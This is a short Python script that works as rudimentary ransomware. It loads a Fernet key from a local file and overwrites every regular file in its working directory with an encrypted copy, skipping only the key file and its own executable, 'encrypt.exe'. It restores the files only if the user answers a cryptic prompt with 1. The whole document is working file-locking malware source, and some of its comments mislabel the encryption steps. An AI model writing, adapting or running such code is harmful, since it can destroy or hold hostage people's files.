from cryptography.fernet import Fernet
import os


def write_key():
    #Generate encrypter key
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def load_key():
    #Load the key
    return open("key.key", "rb").read()

def encrypt(filename, key):
    #Given filename and key, it encrypts the file
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # decrypt data
    encrypted_data = f.encrypt(file_data)
    #write the original file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it decrypts the file and write it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)
#write_key()
key = load_key()
#List all directories        
arr = os.listdir()
#Remove key and the own script
arr.remove('key.key')
arr.remove('encrypt.exe')


#Encrypting file per file



for directory in arr:
    if os.path.isdir(directory):
        pass
    else:
        encrypt(directory, key)

n = int(input("CCUCUCUCUCUC"))
if n == 1:
    for directory in arr:
        if os.path.isdir(directory):
            pass
        else:
            decrypt(directory, key)

